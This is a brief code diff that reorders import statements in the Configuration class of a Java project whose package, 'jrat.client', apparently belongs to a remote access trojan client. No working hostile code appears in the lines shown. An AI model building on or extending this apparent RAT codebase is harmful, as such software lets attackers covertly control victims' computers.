@@ -1,8 +1,13 @@
 package jrat.client;
 
+import jrat.client.utils.Utils;
 import jrat.common.crypto.Crypto;
 import jrat.common.crypto.CryptoUtils;
-import jrat.client.utils.Utils;
+
+import javax.crypto.Cipher;
+import javax.crypto.CipherInputStream;
+import javax.crypto.spec.IvParameterSpec;
+import javax.crypto.spec.SecretKeySpec;
 import java.io.BufferedReader;
 import java.io.InputStream;
 import java.io.InputStreamReader;
@@ -12,10 +17,6 @@ import java.util.Date;
 import java.util.HashMap;
 import java.util.Map;
 import java.util.zip.ZipFile;
-import javax.crypto.Cipher;
-import javax.crypto.CipherInputStream;
-import javax.crypto.spec.IvParameterSpec;
-import javax.crypto.spec.SecretKeySpec;
 
 public class Configuration {
 	
